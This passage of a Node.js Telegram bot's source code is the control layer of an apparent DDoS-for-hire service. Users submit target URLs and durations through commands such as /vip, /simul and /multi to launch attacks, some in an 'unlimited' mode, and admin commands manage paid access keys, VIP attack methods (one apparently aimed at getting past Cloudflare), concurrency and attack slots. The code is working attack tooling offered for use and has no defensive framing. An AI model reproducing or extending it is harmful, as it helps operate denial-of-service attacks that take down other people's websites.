    this.activeAttacks = activeAttacks;
  }

  async handle(chatId, userId, inputs) {
    if (userId !== this.config.adminId) {
      return this.bot.sendMessage(chatId, "❌ Access denied. Admin only.");
    }
    const command = inputs[1]?.toLowerCase() || 'help';
    switch (command) {
      case 'status': return this.status(chatId);
      case 'users': return this.users(chatId);
      case 'methods': return this.bot.sendMessage(chatId, MessageFormatter.methodsList(), { parse_mode: 'Markdown' });
      case 'stop': return this.stopAll(chatId);
      case 'broadcast': return this.broadcast(chatId, inputs.slice(2).join(' '));
      case 'cooldown': return this.setCooldown(chatId, inputs[2]);
      case 'clearlogs': return this.clearLogs(chatId);
      case 'delkey': return this.delKey(chatId, inputs[2]);
      case 'disablekey': return this.disableKey(chatId, inputs[2]);
      case 'enablekey': return this.enableKey(chatId, inputs[2]);
      case 'keys': return this.listKeys(chatId);
      case 'addkey': return this.addKey(chatId, inputs[2], inputs[3]);
      case 'slots': return this.userSlots(chatId, inputs[2]);
      case 'setvip': return this.setVip(chatId, inputs[2]);
      case 'showvip': return this.bot.sendMessage(chatId, `🎯 Current VIP methods: ${this.config.vipMethods.join(', ').toUpperCase()}`);
      case 'setsimul': return this.setSimul(chatId, inputs[2]);
      case 'showsimul': return this.bot.sendMessage(chatId, `💥 Current SIMULTANEOUS methods: ${this.config.simulMethods.join(', ').toUpperCase()}`);
      case 'setconcurrent': return this.setConcurrent(chatId, inputs[2]);
      case 'showconcurrent': return this.bot.sendMessage(chatId, `🔄 Current max concurrent attacks: ${this.config.simultaneousAttacks.maxConcurrent}`);
      case 'help':
      default: return this.showHelp(chatId);
    }
  }

  async status(chatId) {
    const active = this.activeAttacks.size;
    const unlimited = Array.from(this.unlimitedManager.unlimitedAttacks.values()).filter(a => a.active).length;
    const totalUsers = Object.keys(this.dataManager.users).length;
    await this.bot.sendMessage(chatId,
      ` *Bot Status*\n\n` +
      ` Bot is running properly\n` +
      ` Active attacks: ${active}\n` +
      ` Unlimited attacks: ${unlimited}\n` +
      ` Total users: ${totalUsers}\n` +
      ` Cooldown time: ${this.config.cooldownTime} seconds\n` +
      ` Max slots (user/admin): ${this.config.maxSlots}/${this.config.adminMaxSlots}\n` +
      ` VIP Methods: ${this.config.vipMethods.join(', ')}\n` +
      ` SIMUL Methods: ${this.config.simulMethods.join(', ')}\n` +
      ` Max Concurrent: ${this.config.simultaneousAttacks.maxConcurrent}\n` +
      ` Total Methods: ${this.config.validMethods.length}\n` +
      ` Server time: ${moment().format('YYYY-MM-DD HH:mm:ss')}`
    );
  }

  async users(chatId) {
    let list = " *Active Users:*\n";
    this.userAttackSlots.forEach((slots, uid) => {
      const username = this.dataManager.users[uid]?.username || `User_${uid}`;
      const unlimited = this.unlimitedManager.hasForUser(uid) ? ' ♾️' : '';
      list += `• ${username} (${uid}) - Active attacks: ${slots.length}${unlimited}\n`;
    });
    await this.bot.sendMessage(chatId, list || "No active users");
  }

  async stopAll(chatId) {
    const stopped = await this.attackManager.stopAllAttacks(this.bot);
    // Also stop unlimited
    let unlimitedStopped = 0;
    for (const [attackId, attack] of this.unlimitedManager.unlimitedAttacks.entries()) {
      if (attack.active) {
        attack.active = false;
        this.unlimitedManager.unlimitedAttacks.delete(attackId);
        unlimitedStopped++;
      }
    }
    await this.bot.sendMessage(chatId, ` Stopped ${stopped + unlimitedStopped} active attacks`);
  }

  async broadcast(chatId, message) {
    if (!message) return this.bot.sendMessage(chatId, "Usage: /admin broadcast <message>");
    let sent = 0, errors = 0;
    for (const [uid, data] of Object.entries(this.dataManager.users)) {
      try {
        await this.bot.sendMessage(data.chatId, ` *Admin Broadcast:*\n${message}`, { parse_mode: 'Markdown' });
        sent++;
      } catch { errors++; }
    }
    await this.bot.sendMessage(chatId, ` Broadcast sent to ${sent} users. Failed: ${errors}`);
  }

  async setCooldown(chatId, seconds) {
    const val = parseInt(seconds);
    if (isNaN(val) || val < 0) return this.bot.sendMessage(chatId, "Cooldown must be a positive number");
    this.config.cooldownTime = val;
    await this.bot.sendMessage(chatId, ` Cooldown time set to ${val} seconds`);
  }

  async clearLogs(chatId) {
    this.activeAttacks.clear();
    this.userAttackSlots.clear();
    this.userAttackStatus.clear();
    this.unlimitedManager.unlimitedAttacks.clear();
    await this.bot.sendMessage(chatId, " Cleared all active attacks and user status");
  }

  async delKey(chatId, key) {
    if (!key) return this.bot.sendMessage(chatId, "Usage: /admin delkey <key>");
    const k = key.toUpperCase();
    if (this.dataManager.keys[k]) {
      delete this.dataManager.keys[k];
      await this.dataManager.saveKeys();
      await this.bot.sendMessage(chatId, `✅ Key ${k} has been deleted`);
    } else {
      await this.bot.sendMessage(chatId, `❌ Key ${k} not found`);
    }
  }

  async disableKey(chatId, key) {
    if (!key) return this.bot.sendMessage(chatId, "Usage: /admin disablekey <key>");
    const k = key.toUpperCase();
    if (this.dataManager.keys[k]) {
      this.dataManager.keys[k].enabled = false;
      await this.dataManager.saveKeys();
      await this.bot.sendMessage(chatId, `✅ Key ${k} has been disabled`);
    } else {
      await this.bot.sendMessage(chatId, `❌ Key ${k} not found`);
    }
  }

  async enableKey(chatId, key) {
    if (!key) return this.bot.sendMessage(chatId, "Usage: /admin enablekey <key>");
    const k = key.toUpperCase();
    if (this.dataManager.keys[k]) {
      this.dataManager.keys[k].enabled = true;
      await this.dataManager.saveKeys();
      await this.bot.sendMessage(chatId, `✅ Key ${k} has been enabled`);
    } else {
      await this.bot.sendMessage(chatId, `❌ Key ${k} not found`);
    }
  }

  async listKeys(chatId) {
    await this.bot.sendMessage(chatId, MessageFormatter.formatKeysList(this.dataManager.keys), { parse_mode: 'Markdown' });
  }

  async addKey(chatId, type, key) {
    if (!type || !key) return this.bot.sendMessage(chatId, "Usage: /admin addkey <type> <key>");
    const k = key.toUpperCase();
    if (this.dataManager.keys[k]) return this.bot.sendMessage(chatId, `❌ Key ${k} already exists`);
    this.dataManager.keys[k] = { type: type.toUpperCase(), enabled: true, usedBy: [], createdAt: new Date().toISOString() };
    await this.dataManager.saveKeys();
    await this.bot.sendMessage(chatId, `✅ Key added successfully!\n\nKey: ${k}\nType: ${type.toUpperCase()}\nStatus: ✅ Enabled`);
  }

  async userSlots(chatId, userIdStr) {
    const userId = parseInt(userIdStr);
    if (isNaN(userId)) return this.bot.sendMessage(chatId, "Invalid user ID");
    const slots = this.userAttackSlots.get(userId) || [];
    const max = this.attackManager.getMaxSlots(userId);
    const username = this.dataManager.users[userId]?.username || `User_${userId}`;
    const unlimited = this.unlimitedManager.hasForUser(userId);
    let msg = `🎯 *Slots for ${username}*\n\nUsed: ${slots.length}/${max}\nUnlimited: ${unlimited ? '✅' : '❌'}\n\n`;
    if (slots.length) {
      msg += `*Active Attacks:*\n`;
      slots.forEach((aid, i) => {
        const attack = this.activeAttacks.get(aid);
        if (attack) {
          msg += `${i+1}. ${attack.method} on ${attack.target}\n`;
        }
      });
    } else {
      msg += 'No active attacks.';
    }
    await this.bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
  }

  async setVip(chatId, methodsStr) {
    if (!methodsStr) return this.bot.sendMessage(chatId, "Usage: /admin setvip <method1,method2,...>");
    const methods = methodsStr.split(',').map(m => m.trim().toLowerCase());
    const invalid = methods.filter(m => !this.config.validMethods.includes(m));
    if (invalid.length) return this.bot.sendMessage(chatId, `❌ Invalid VIP methods: ${invalid.join(', ')}`);
    this.config.vipMethods = methods;
    await this.config.save();
    await this.bot.sendMessage(chatId, `✅ VIP methods updated and saved: ${methods.join(', ').toUpperCase()}`);
  }

  async setSimul(chatId, methodsStr) {
    if (!methodsStr) return this.bot.sendMessage(chatId, "Usage: /admin setsimul <method1,method2,...>");
    const methods = methodsStr.split(',').map(m => m.trim().toLowerCase());
    const invalid = methods.filter(m => !this.config.validMethods.includes(m));
    if (invalid.length) return this.bot.sendMessage(chatId, `❌ Invalid SIMULTANEOUS methods: ${invalid.join(', ')}`);
    this.config.simulMethods = methods;
    await this.config.save();
    await this.bot.sendMessage(chatId, `✅ SIMULTANEOUS methods updated and saved: ${methods.join(', ').toUpperCase()}`);
  }

  async setConcurrent(chatId, numStr) {
    const num = parseInt(numStr);
    if (isNaN(num) || num < 1 || num > 10) return this.bot.sendMessage(chatId, "Max concurrent must be a number between 1 and 10");
    this.config.simultaneousAttacks.maxConcurrent = num;
    await this.config.save();
    await this.bot.sendMessage(chatId, `✅ Max concurrent attacks set to ${num}`);
  }

  async showHelp(chatId) {
    await this.bot.sendMessage(chatId, `
👑 *ADMIN COMMANDS*

📊 *Monitoring:*
• /admin status - Check bot status and statistics
• /admin users - List all active users and their status
• /admin slots <userId> - Check slots for a specific user

⚡ *Attack Management:*
• /admin methods - View all attack methods
• /admin stop - Stop all active attacks immediately
• /admin cooldown <seconds> - Set global cooldown time

🎯 *VIP Methods Control:*
• /admin setvip <methods> - Set VIP attack methods (comma separated)
• /admin showvip - Show current VIP methods

💥 *SIMULTANEOUS Methods Control:*
• /admin setsimul <methods> - Set SIMULTANEOUS attack methods
• /admin showsimul - Show current SIMULTANEOUS methods

🔄 *Concurrent Attacks Control:*
• /admin setconcurrent <number> - Set max concurrent attacks (1-10)
• /admin showconcurrent - Show current max concurrent setting

🔑 *Key Management:*
• /admin addkey <type> <key> - Add a new key
• /admin delkey <key> - Delete a key
• /admin disablekey <key> - Disable a key temporarily
• /admin enablekey <key> - Enable a key
• /admin keys - List all keys

📢 *Administration:*
• /admin broadcast <message> - Broadcast message to all users
• /admin clearlogs - Clear all active attacks and user status

🆘 *Help:*
• /admin help - Show this help message

*Usage:* /admin <command> [parameters]
*Examples:*
/admin setvip zaher,zaherh2,cfzaher
/admin setsimul zaher,zaherh2,cfzaher
/admin addkey VIP MYVIPKEY123
/admin setconcurrent 5
    `, { parse_mode: 'Markdown' });
  }
}

// ==================== Main Bot ====================
const config = new Config();
const dataManager = new DataManager(config);
const activeAttacks = new Map();
const userAttackSlots = new Map();
const userAttackStatus = new Map();
const unlimitedAttacks = new Map();

const attackExecutor = new AttackExecutor(config, dataManager, activeAttacks, userAttackSlots);
const attackManager = new AttackManager(config, dataManager, activeAttacks, userAttackSlots, userAttackStatus);
const unlimitedManager = new UnlimitedAttackManager(attackExecutor, unlimitedAttacks);

let bot;
try {
  bot = new TelegramBot(config.botToken, { polling: config.pollingOptions });
  console.log('🤖 Bot initialized with polling...');
} catch (error) {
  console.error('❌ Failed to initialize bot:', error);
  process.exit(1);
}

const commandHandler = new CommandHandler(bot, config, dataManager, attackManager, attackExecutor, unlimitedManager, userAttackSlots, activeAttacks);
const adminHandler = new AdminCommandHandler(bot, config, dataManager, attackManager, unlimitedManager, userAttackSlots, activeAttacks);

// Error handlers
bot.on('polling_error', (error) => console.error('Polling error:', error));
bot.on('error', (error) => console.error('Bot error:', error));

// Message handler
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = msg.text?.trim();
  if (!text) return;

  dataManager.recordUserActivity(userId, msg.from.username, chatId);
  const inputs = text.split(/\s+/);
  const command = inputs[0].toLowerCase();

  try {
    if (command === '/admin') {
      await adminHandler.handle(chatId, userId, inputs);
      return;
    }

    switch (command) {
      case '/start': await commandHandler.handleStart(msg); break;
      case '/help': await commandHandler.handleHelp(chatId); break;
      case '/methods': await commandHandler.handleMethods(chatId); break;
      case '/status': await commandHandler.handleStatus(chatId, userId); break;
      case '/owner': await commandHandler.handleOwner(chatId); break;
      case '/stop': await commandHandler.handleStop(chatId, userId); break;
      case '/key': await commandHandler.handleKey(chatId, userId, inputs); break;
      case '/mykey': await commandHandler.handleMyKey(chatId, userId); break;
      case '/slots': await commandHandler.handleSlots(chatId, userId); break;
      case '/vip':
        if (inputs.length < 3) return bot.sendMessage(chatId, "❌ Wrong command!\nUse: /vip <url> <time>\nEx: /vip https://example.com 60");
        await commandHandler.handleVipAttack(userId, chatId, inputs[1], inputs[2]);
        break;
      case '/simul':
        if (inputs.length < 3) return bot.sendMessage(chatId, "❌ Wrong command!\nUse: /simul <url> <time>\nOr: /simul Unlimited <url>");
        if (inputs[1].toLowerCase() === 'unlimited') {
          await commandHandler.handleUnlimitedAttack(userId, chatId, inputs[2]);
        } else {
          await commandHandler.handleSimultaneousAttack(userId, chatId, inputs[1], inputs[2]);
        }
        break;
      case '/multi':
        if (inputs.length < 4) return bot.sendMessage(chatId, "❌ Wrong command!\nUse: /multi <url> <time> <methods>");
        await commandHandler.handleMultiAttack(userId, chatId, inputs[1], inputs[2], inputs[3]);
        break;
      default:
        if (config.validMethods.includes(command.replace('/', '').toLowerCase())) {
          if (inputs.length < 4) return bot.sendMessage(chatId, MessageFormatter.errorMessage(), { parse_mode: 'Markdown' });
          await commandHandler.handleAttack(userId, chatId, command.replace('/', ''), inputs[1], inputs[2], inputs[3]);
        }
    }
  } catch (err) {
    console.error('Error handling message:', err);
    await bot.sendMessage(chatId, '❌ An error occurred while processing your request.');
  }
});

// Initialize data
(async () => {
  await dataManager.loadUsers();
  await dataManager.loadKeys();
  await config.load();
  console.log('🤖 Bot is running with enhanced simultaneous attacks...');
  console.log('🆕 Methods: zaher, zaherH2, CFZAHER');
  console.log('⚙️ Configuration persistence enabled');
  console.log('♾️ Unlimited attack mode available');
})();

